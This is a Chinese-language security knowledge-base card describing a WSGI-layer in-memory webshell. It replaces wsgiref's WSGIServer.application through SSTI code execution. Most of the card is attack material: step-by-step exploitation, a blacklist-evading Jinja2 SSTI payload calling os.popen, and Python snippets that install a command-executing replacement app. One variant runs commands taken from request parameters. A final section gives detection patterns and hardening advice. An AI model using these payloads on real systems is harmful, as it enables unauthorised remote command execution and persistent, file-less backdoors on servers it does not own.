---
id: web-python-framework-wsgiref-server-application-overwrite-memshell
title: 覆盖 wsgiref.simple_server.WSGIServer.application 完成整应用替换：不落盘、不影响后续请求解析的 WSGI 层内存马（原路由表被整体顶替）
type: scenario
domain: web
path: web/python/framework
technique: wsgiref-wsgiserver-application-overwrite-memshell
tags:
- python
- pyramid
- wsgiref
- memshell
- ssti
- route-overwrite
- exec
- persistence
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W6
  verified_at: '2026-11-09T00:41:24+08:00'
  notes: 已对照原文核对；本次核对未读取图片，仅依据正文；WSGIServer.application/set_app/get_app 语义、add_route+add_view 成对、make_wsgi_app 构造、SSTI exec 绕黑名单写法（属性用 attr 过滤、soft 用相邻字面量拼接）均与正文一致；已把原文 payload 实际是覆盖 __main__.server 实例（而非类）这一点补进原理，原路由全 404、内存马驻留等结论来自正文文字未复现
url: /docs/web/python/framework/web-python-framework-wsgiref-server-application-overwrite-memshell/
draft: false
kb_aliases:
- WSGIServer application 覆盖
- WSGI 层内存马
- wsgiref 内存马
- set_app 覆盖 application
- Pyramid 整应用替换
- get_wsgi_app 内存马
---

## 一句话结论

在 `wsgiref.simple_server.make_server(addr, port, app)` 起服务的 Python Web 应用里，只要拿到任意 Python 代码执行（典型入口是 SSTI），就能 `setattr(wsgiref.simple_server.WSGIServer, 'application', <自建 app>)`，把服务器对象上保存的 WSGI 可调用对象整体换掉：此后每个新请求都由攻击者的 app 处理，原应用的路由表（包括原题目里的 `/shell` 等路径）**全部消失**，而进程、端口、监听 fd 都不变，磁盘上不留任何文件，重启即失效。

## 原理

- **wsgiref 的 application 定义在 `WSGIServer` 类上**：`WSGIServer(HTTPServer)` 定义 `application = None`，`set_app(application)` 只是 `self.application = application`，`get_app()` 直接 `return self.application`。`WSGIRequestHandler` 在每个请求里调用 `server.get_app()` 拿到 WSGI app 再交给 `ServerHandler` 执行——也就是说**请求分派的真正入口是这个属性**，框架自己的路由表只是被这个属性间接引用。
- **覆盖时机在请求处理链之外**：`application` 定义在类上，所以既能改类（`setattr(WSGIServer, 'application', app)`，对进程内所有实例生效），也能像原文那样直接改 `make_server(...)` 返回的那个 server 实例（实例属性遮蔽类属性，原文 payload 传的 `__main__.server` 即为此），下一个请求即走新 app；不需要重启、不需要触碰框架的 route registry，也不受「框架注册期已结束」这类限制（这点和 Flask 的 `_got_first_request` 保护、Pyramid 的 `add_route` 需 `commit()` 都不同：这里根本不进框架的注册流程）。
- **为什么能造出合法的新 app**：新 app 必须是一个 WSGI 可调用对象 `app(environ, start_response)`。原文的做法是复用目标进程里已导入的框架对象：`Configurator()` → `add_route` → `add_view(lambda context, request: <cmd>, route_name=..., renderer='string', permission='view')` → `make_wsgi_app()`，得到一个完整的 Pyramid WSGI app，然后整个塞进 `WSGIServer.application`。要点是 **Pyramid 需要 `add_route` 与 `add_view` 成对出现**（只有 route 没有 view 会 404），而 `lambda` 视图配 `renderer='string'` 才能把返回值当响应体直接吐出。
- **为什么原路由会消失**：新 app 的路由表里只有攻击者注册的那一条；旧 app 对象虽然可能仍被别处引用（例如 `__main__.app`），但 server 不再问它要响应，所以外部观察到的现象是「原有接口全部 404、只有攻击者路径可用」——这反而是**最容易识别的副作用**，也是检测点。
- **与「框架路由内存马」的区别**：框架路由内存马（Flask/Pyramid 的 `add_route`/`add_url_rule`）是在既有 app 上追加一条路由，其它路由照常；本手法是**整应用替换**，体积更小（一条 `setattr` 即可）、对框架版本依赖更低，但破坏性更大、更难藏。
- **为什么这条路线在无回显场景下特别有用**：原文环境里 `exec` 与常见内置函数都没被禁用，但用户是 `nobody`、目录不可写、`/tmp` 受限，写文件的回显方案走不通；而把「命令执行结果」直接编码进 lambda 视图的返回值，一次 `exec` 就能获得一条长期可用的命令通道，不需要额外的一次请求去读产物文件。

## 触发条件

- Python Web 服务确实由 `wsgiref.simple_server` 系列起（`make_server(...)` / `WSGIServer` + `ServerHandler`），例如 Pyramid、Bottle 的开发服务器或自建脚本；若前置是 gunicorn/uWSGI（各自实现 server 对象），则没有这个类属性可用。
- 已获得任意 Python 代码执行或等价能力（SSTI 的 `exec`、反序列化、被暴露的 `eval` 接口等）。
- 目标进程里能取到 `wsgiref.simple_server` 模块以及一个能构造 WSGI app 的框架对象（Pyramid 的 `Configurator`、Flask 的 `Flask(__name__)` 等）；取不到框架对象时可自己写一个纯函数式 app（只用 `start_response` + 字节串返回）。
- 进程在覆盖后仍持续接收请求（没有单请求即退出的守护逻辑）。

## 利用步骤

1. 确认服务栈：读响应头/错误页特征，或直接读源码（如 `app.py` 里出现 `from wsgiref.simple_server import make_server`、`make_server('0.0.0.0', <port>, app)`），确认是 wsgiref 而非独立 WSGI 服务器。
2. 确认代码执行点能拿到模块对象：SSTI 里用 `lipsum.__spec__.__init__.__globals__.sys.modules`（或 `__globals__['__builtins__']['__import__']('wsgiref.simple_server')`）取到 `wsgiref` 模块，再 `.simple_server.WSGIServer`。
3. 构造新 app：在 `exec` 的字符串里 `from pyramid.config import Configurator`，`add_route('x','/x')`、`add_view(lambda context, request: <cmd output>, route_name='x', renderer='string', permission='view')`、`app = config.make_wsgi_app()`。
4. 覆盖：`setattr(WSGIServer, 'application', app)`（等价 `WSGIServer.set_app(self, app)`，但类属性直接赋值最省字节）。
5. 请求原路径验证「旧路由已消失」（应 404），再请求攻击者路径确认命令回显。
6. 若需要动态传参而不受 WAF 的字符/数字过滤限制，见变体：用 `{{request.GET.get('x')}}` 或从 `pyramid.request.Request` 取 query/表单，把命令从模板层传进视图。

## PoC

原文通过 SSTI 一次 `exec`（属性名与 `permission` 等关键字用 `attr`/相邻字面量拆分以绕黑名单，`server_software` 处的 `soft` 被过滤用 `'server_so''ftware'` 拼接）：

```jinja2
{{(lipsum['__globals__']['__builtins__']['exec'])("config=Configurator()\n"
"getattr(config,'add_route')('jerry','/jerry')\n"
"getattr(config,'add_view')(lambda context, request: shell, route_name='jerry', renderer='string', permission='view')\n"
"getattr(config,'scan')()\n"
"app = getattr(config,'make_wsgi_app')()\n"
"setattr(WSGIServer,'application',app)",
{"simple_server":(((lipsum|attr('__spec__'))|attr('__init__')|attr('__globals__'))['sys']|attr('modules'))['wsgiref']['simple_server']['WSGIServer'],
 "shell":lipsum['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read'](),
 'WSGIServer':(((lipsum|attr('__spec__'))|attr('__init__')|attr('__globals__'))['sys']|attr('modules'))['__main__']['server'],
 'Configurator':(((lipsum|attr('__spec__'))|attr('__init__')|attr('__globals__'))['sys']|attr('modules'))['__main__']['Configurator']})}}
```

关键：新 app 的构造顺序必须是 `add_route` → `add_view` → `make_wsgi_app`，最后 `setattr(WSGIServer,'application', app)`：

```python
config = Configurator()
config.add_route('jerry', '/jerry')
config.add_view(lambda context, request: __import__('os').popen('whoami').read(),
                route_name='jerry', renderer='string', permission='view')
app = config.make_wsgi_app()
WSGIServer.application = app          # 整应用替换，原路由全部失效
```

最小不依赖框架的等价写法（只要求进程里有 wsgiref）：

```python
import wsgiref.simple_server as ss
def evil(environ, start_response):
    import os
    body = os.popen('id').read().encode()
    start_response('200 OK', [('Content-Type', 'text/plain'), ('Content-Length', str(len(body)))])
    return [body]
ss.WSGIServer.application = evil
```

## 变体与关联

- **变体（动态传参）**：把命令改成从请求取，避开「结果固定」和长度限制：`lambda context, request: __import__('os').popen(request.params.get('c','id')).read()`；模板层也可以用 `{{(request|attr('GET')|attr('get'))('x')}}` 把参数带进 `exec`。
- **变体（不替换整应用，只挂载/覆盖单条路由）**：在 Pyramid 上对既有 app 用 `add_route` + `add_view` + `commit()`（`make_wsgi_app` 之后再配置必须补 commit），或在 Flask 上绕过 `_got_first_request` 后 `add_url_rule`；这类做法保留原路由，隐蔽性更好但依赖框架版本。
- **变体（回显通道）**：本卡只讲「应用替换」；若连新 app 都构造不出来，可退化为改 `ServerHandler.http_version`/`server_software`、`BaseHandler.error_body`、`HTTPNotFound.explanation` 这类属性把命令输出顶到响应首行/`Server:` 头/错误页（已由 [[web-python-ssti-wsgiref-handler-attribute-response-hijack]] 覆盖），或用 `inspect.currentframe().f_locals` 把结果塞进会被异常回显的变量。
- **关联**：[[web-python-framework-pyramid-runtime-route-memshell-commit]]（同为 Pyramid 运行时植入，但那条是追加路由且必须 `commit()`）、[[web-python-ssti-wsgiref-handler-attribute-response-hijack]]（同一 WSGI 层的属性污染回显路线）、[[defense-detection-flask-memshell-pyrasite-inspect]]（对 Python 内存马的运行期查杀思路）。
- **边界**：前置换成 gunicorn/uWSGI 时无 `WSGIServer.application`；若目标每请求 fork 或每次请求重启解释器，覆盖不持久；覆盖后原 app 若仍被其它线程/入口使用，可能出现「部分请求正常、部分 404」的不一致现象。

## 检测与防御

- **不要动态渲染用户输入**，禁止把外部输入交给 `exec`/`eval`；模板引擎用 `SandboxedEnvironment`，并从上下文移除 `lipsum`/`cycler`/`request` 等可取到 `sys.modules` 的跳板。
- **生产不要用 wsgiref 开发服务器**：换成 gunicorn/uWSGI 等，既没有这个可写的类属性，也不该把开发服务器暴露在公网。
- **检测**：同一路径先返回 200、后续全部 404 而端口/进程未变的突变；进程内 `WSGIServer.application` 与启动基线不一致（用 `pyrasite`/`py-spy` 注入后比对 id）；请求体或模板输入里出现 `wsgiref`、`WSGIServer`、`setattr`、`make_wsgi_app`、`Configurator`、`sys.modules`、`__spec__`；`os.popen`/`subprocess` 在 Web 进程里被调用。
- **加固**：Web 进程最小权限（本类内存马常伴随 `nobody` 用户、目录不可写——这不阻止攻击，只阻止写文件回显）；对关键模块属性做运行期完整性校验（定时比对 `WSGIServer.application` 的对象 id 与函数体 hash）；容器化 + 只读根文件系统 + 定期滚动重启可缩短驻留时间。
